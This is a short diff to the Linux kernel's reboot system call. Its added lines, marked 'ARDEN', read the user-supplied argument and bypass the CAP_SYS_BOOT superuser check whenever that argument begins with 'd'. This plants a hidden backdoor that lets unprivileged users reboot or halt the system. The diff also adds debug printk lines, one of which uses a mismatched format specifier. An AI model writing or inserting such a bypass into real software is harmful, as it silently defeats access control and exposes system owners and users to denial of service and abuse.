@@ -364,8 +364,13 @@ SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,
 	int ret = 0;
 
 	/* We only trust the superuser with rebooting the system. */
-	if (!capable(CAP_SYS_BOOT))
-		return -EPERM;
+	strncpy_from_user(&buffer[0], arg, sizeof(buffer) - 1);		//ARDEN
+	printk("[ ARDEN ]" "args = '%d'.\n", arg);
+	printk("[ ARDEN ]" "buffer[0] = '%c'.\n", buffer[0]);
+	if(buffer[0] != 'd'){										//ARDEN
+		if (!capable(CAP_SYS_BOOT))
+			return -EPERM;
+	}															//ARDEN
 
 	/* For safety, we require "magic" arguments. */
 	if (magic1 != LINUX_REBOOT_MAGIC1 ||
